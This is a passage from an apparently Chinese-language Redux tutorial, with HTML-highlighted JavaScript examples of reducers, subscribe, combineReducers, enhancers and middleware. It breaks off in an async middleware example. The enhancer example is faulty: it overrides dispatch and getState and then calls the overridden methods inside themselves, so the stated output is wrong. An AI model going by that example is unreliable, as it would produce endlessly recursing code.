operator">=></span> state<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">userReducer</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">state<span class="token punctuation">,</span> action</span><span class="token punctuation">)</span> <span class="token operator">=></span> state<span class="token punctuation">;</span><span class="token keyword">const</span> addTodo <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'todo/add'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">const</span> renameUser <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'user/rename'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="响应更新"><a href="#响应更新" class="headerlink" title="响应更新"></a>响应更新</h4><p>更新 <code>state</code> 的 <code>action</code> 被触发了，还需要定义一些操作对其进行响应，在 <code>action</code> 触发时执行，即指定如何更新 <code>state</code>；</p><p>这里更新 <code>state</code> 的逻辑写在之前创建 <code>store</code> 时传入的 <code>reducer</code> 函数中，由于 Redux 中的 <code>state</code> 是只读的（并未强制，但需自行在代码中遵守），所以 <code>reducer</code> 每次返回的 <code>state</code> 都是新的；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> myState <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">num</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">myReducer</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">state<span class="token operator">=</span>myState<span class="token punctuation">,</span> action</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>action<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'add'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">num</span><span class="token operator">:</span> state<span class="token punctuation">.</span>num <span class="token operator">+</span> <span class="token number">1</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> state<span class="token punctuation">;</span> <span class="token comment">// 非指定状态需要考虑返回原状态</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> store <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">createStore</span><span class="token punctuation">(</span>myReducer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> myAction <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'add'</span><span class="token punctuation">&#125;</span>store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span>myAction<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>store<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Redux 并未强制 <code>reducer</code> 中的 <code>state</code> 为只读的，其实是可以对其进行修改，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> defaultState <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">num</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">const</span> store <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">createStore</span><span class="token punctuation">(</span>    <span class="token punctuation">(</span><span class="token parameter">state<span class="token operator">=</span>defaultState<span class="token punctuation">,</span> action</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>action<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'add'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            state<span class="token punctuation">.</span>num <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> state<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> state<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>store<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123; num: 0 &#125;</span>store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'add'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>store<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123; num: 1 &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但官方并不建议这么做，这有可能导致页面数据得不到及时更新的 bug，所以需要开发者考虑自行维护其<strong>不可变性（Immutability）</strong>，这也能实现更好的状态追踪，问题追溯等开发体验，如官网提到的一项叫 <code>time traveling debugging</code> 技术；并且，Redux 官网对该框架的介绍也是 <code>Redux is a predictable state container</code>，即具有预见性的状态管理器；</p><h3 id="订阅状态"><a href="#订阅状态" class="headerlink" title="订阅状态"></a>订阅状态</h3><p><code>subscribe()</code> 是 store 对象的方法之一，它接收一个函数作为参数，用于设置监听器以订阅状态的更新，即指定 <code>state</code> 更新时应该做什么；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> store <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">createStore</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">state<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> action</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>action<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'add'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> state <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> state<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>store<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 指定每次更新状态就打印当前值</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'dispatch'</span><span class="token punctuation">,</span> store<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'add'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 'dispatch' 1</span>store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'add'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 'dispatch' 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="状态合成"><a href="#状态合成" class="headerlink" title="状态合成"></a>状态合成</h3><p>虽然 Redux 为了管理方便而设置单一的 <code>store</code> 对所有 <code>state</code> 进行统一管理，但是状态量的增长会使得书写变得复杂，所以 Redux 对象提供了一个 <code>combineReducers()</code> 方法，将所有声明的分工不同（不同组件、页面或子应用）的 <code>reducer</code> 合并为一个总的 <code>reducer</code>；</p><p>该方法接收一个对象作为参数，不同的属性名用于标识不同作用的 <code>reducer</code>，以及状态更新后从 <code>store</code> 中取回状态值，属性值为声明的 <code>reducer</code> 函数；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">calcReducer</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">state<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> action</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>action<span class="token punctuation">.</span>type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token string">'add'</span><span class="token operator">:</span>            <span class="token keyword">return</span> state <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'minus'</span><span class="token operator">:</span>            <span class="token keyword">return</span> state <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token operator">:</span>            <span class="token keyword">return</span> state<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">countReducer</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">state<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> action</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>action<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'add'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> state <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> state<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> rootReducer <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">combineReducers</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">calc</span><span class="token operator">:</span> calcReducer<span class="token punctuation">,</span>    <span class="token literal-property property">count</span><span class="token operator">:</span> countReducer<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> store <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">createStore</span><span class="token punctuation">(</span>rootReducer<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>store<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123; calc: 1, count: 0, &#125;</span>store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'add'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>store<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123; calc: 2, count: 1 &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>combineReducers()</code> 参数对象中指定的属性名用于存储该 reducer 的所有状态值；</p><h3 id="Enhancer"><a href="#Enhancer" class="headerlink" title="Enhancer"></a>Enhancer</h3><p><code>Redux.createStore()</code> 方法还可以接收第三个参数 **<code>enhancer</code>**，用于自定义 <code>store</code> 的功能或强化其能力（例如魔改），比如改变 <code>dispatch()</code>, <code>getState()</code>, <code>subscribe()</code> 等方法的默认行为；</p><p><code>enhancer</code> 参数为一个自定义函数，其接收 <code>Redux.createStore</code> 这个方法作为参数，并返回一个新的 <code>createStore</code> 方法；</p><p>下面是一个为 <code>dispatch</code> 添加功能的简单示例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">myReducer</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">state<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> action</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>action<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'add'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> state <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> state<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// enhancer 接收一个参数，即 Redux.createStore 这个方法，</span><span class="token comment">// 用于执行创建 store 的默认行为；</span><span class="token keyword">const</span> <span class="token function-variable function">myEnhancer</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">createStore</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// enhancer 需要返回一个函数，其参数与 Redux.createStore 的相同，</span>    <span class="token comment">// 可以理解为返回另一个新的 createStore 函数；</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">reducer<span class="token punctuation">,</span> initialState<span class="token punctuation">,</span> enhancer</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 需要执行一次 Redux.createStore 的默认行为，并获取 store</span>        <span class="token keyword">const</span> store <span class="token operator">=</span> <span class="token function">createStore</span><span class="token punctuation">(</span>reducer<span class="token punctuation">,</span> initialState<span class="token punctuation">,</span> enhancer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 修改 store 中的默认 dispatch 方法</span>        store<span class="token punctuation">.</span><span class="token function-variable function">dispatch</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">action</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 新加的功能</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'dispatched.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 最后仍需执行一次 dispatch 的默认行为</span>            <span class="token keyword">return</span> store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span>action<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token comment">// 修改默认的 getState 方法</span>        store<span class="token punctuation">.</span><span class="token function-variable function">getState</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> store<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 返回的新 createStore 方法还需要返回一个对象，即整个 store 对象；</span>        <span class="token keyword">return</span> store<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> store <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">createStore</span><span class="token punctuation">(</span>myReducer<span class="token punctuation">,</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> myEnhancer<span class="token punctuation">)</span><span class="token punctuation">;</span>store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'add'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "dispatched."</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>store<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要同时使用多个 <code>enhancer</code> 时，需要进行合成，可以使用 <code>Redux.compose()</code> 方法：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> enhancers <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">compose</span><span class="token punctuation">(</span>enhancer1<span class="token punctuation">,</span> enhancer2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 可以传入多个参数作 enhancer</span><span class="token keyword">const</span> store <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">createStore</span><span class="token punctuation">(</span>myReducer<span class="token punctuation">,</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> enhancers<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Middleware"><a href="#Middleware" class="headerlink" title="Middleware"></a>Middleware</h3><p>大多数时候，我们只希望自定义 <code>dispatcch</code> 方法的逻辑，所以官方专门提供了一个叫 <strong><code>middleware</code></strong> 的特性，翻译过来就是<strong>中间件</strong>，即在触发 <code>action</code> 和调用 <code>reducer</code> 执行响应之间，给用户提供一个可操作空间，如用于日志记录，问题报告，或者处理异步操作等；</p><p><code>middleware</code> 是一个自定义函数，其接收一个对象作为参数，该参数对象有两个方法，分别是 <code>dispatch</code> 和 <code>getState</code>，逻辑都与 <code>store</code> 对象中的两个同名方法相同；</p><p><code>middleware</code> 函数还需要返回另一个函数作为包装（自定义）后的 <code>dispatch</code> 方法，由于逻辑层次较多，下面会通过代码说明；</p><p>Redux 中内置了一个叫做 <code>applyMiddleware</code> 的 <code>enhancer</code> 方法，用于添加 <code>middleware</code>，它可以接收多个参数以传入多个 <code>middleware</code>；</p><p>具体实现通过举例说明：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">myReducer</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">state<span class="token punctuation">,</span> action</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>action<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'add'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> state <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> state<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 自定义的中间件函数</span><span class="token keyword">const</span> <span class="token function-variable function">myMiddleware1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">&#123;</span> dispatch<span class="token punctuation">,</span> getState <span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 中间件需要返回一个函数，即新的 dispatch 逻辑，</span>    <span class="token comment">// 该函数又接收一个参数 next，用于执行下一个 middleware，</span>    <span class="token comment">// 当然如果有下一个中间件就执行，没有了就执行原始的 dispatch，</span>    <span class="token comment">// 其实这个参数 next 也就是原始的那个 store.dispatch 方法；</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 该函数也需要返回一个函数，用于处理 action，</span>        <span class="token comment">// 接收一个 acction 作参数，即 store 触发的 action；</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">action</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 自定义逻辑</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'mid 1'</span><span class="token punctuation">,</span> <span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 这个函数还需要返回一个函数，即用之前的 next 方法</span>            <span class="token comment">// 将 action 传递给下一个 middleware 继续处理；</span>            <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span>action<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 也可以使用简写方式</span><span class="token keyword">const</span> <span class="token function-variable function">myMiddleware2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">&#123;</span> getState <span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token parameter">next</span> <span class="token operator">=></span> <span class="token parameter">action</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'mid 2'</span><span class="token punctuation">,</span> <span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token function">next</span><span class="token punctuation">(</span>action<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'mid 2 new'</span><span class="token punctuation">,</span> <span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 使用中间件</span><span class="token keyword">const</span> myEnhancer <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">applyMiddleware</span><span class="token punctuation">(</span>myMiddleware1<span class="token punctuation">,</span> myMiddleware2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> store <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">createStore</span><span class="token punctuation">(</span>myReducer<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> myEnhancer<span class="token punctuation">)</span><span class="token punctuation">;</span>store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'add'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// "mid 1" 1</span><span class="token comment">// "mid 2" 1</span><span class="token comment">// "mid 2 new" 2</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>store<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总结一下整个执行过程就是：</p><ul><li><p>用户调用了 <code>store.dispatch()</code> 触发 <code>action</code>；</p></li><li><p>Redux 按 <code>applyMiddleware()</code> 方法中参数的传入顺序，挨个执行自定义的 <code>middleware</code> 逻辑；</p></li><li><p>然后再调用原始的 <code>store.dispatch()</code> 方法触发 <code>action</code>；</p></li><li><p>最终执行 <code>reducer</code> 中的逻辑；</p><p>整个过程有些类似函数的链式调用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dispatch -<span class="token operator">></span> middleware1 -<span class="token operator">></span> middleware2 <span class="token punctuation">..</span>. -<span class="token operator">></span> dispatch -<span class="token operator">></span> reducer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>此外，由于 <code>middleware</code> 的执行逻辑，其特性还包括对 <code>action</code> 中数据的修改、中断甚至彻底停止 <code>action</code>，的触发，例如上例中最后不返回 <code>next(action)</code>，那么整个过程执行完第一个 <code>middleware</code> 就结束了，<code>state</code> 也不会发生预期的改变；</p><h3 id="处理异步逻辑"><a href="#处理异步逻辑" class="headerlink" title="处理异步逻辑"></a>处理异步逻辑</h3><p>Redux 内部并不知道如何处理异步逻辑，只会同步的触发 action，然后调用 reducer 更新 state，所以任何异步逻辑需要我们在外部自己实现；而 Redux 的宗旨是 recuder 不要有任何<strong>副作用</strong>，最好是一个<strong>纯函数</strong>，即不要有多余的外部联系，如控制台打印，异步请求等；</p><p>而 <code>middleware</code> 就是 Redux 专为<strong>副作用</strong>逻辑需求而设计的，这里以异步操作为例用代码进行简单实现：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">reducer</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">state<span class="token punctuation">,</span> action</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>action<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'add'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> state <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>action<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'asyncAdd'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> action<span class="token punctuation">.</span>data<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> state<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">asyncMiddleware</span> <span class="token operator">=</span> <span class="token parameter">_store</span> <span class="token operator">=></span> <span class="token parameter">next</span> <span class="token operator">=></span> <span class="token parameter">action</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>action<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'asyncAdd'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            action<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token string">'some data.'</span><span class="token punctuation">;</span>            <span class="token function">next</span><span class="token punctuation">(</span>action<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">next</span><span class="token punctuation">(</span>action<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token 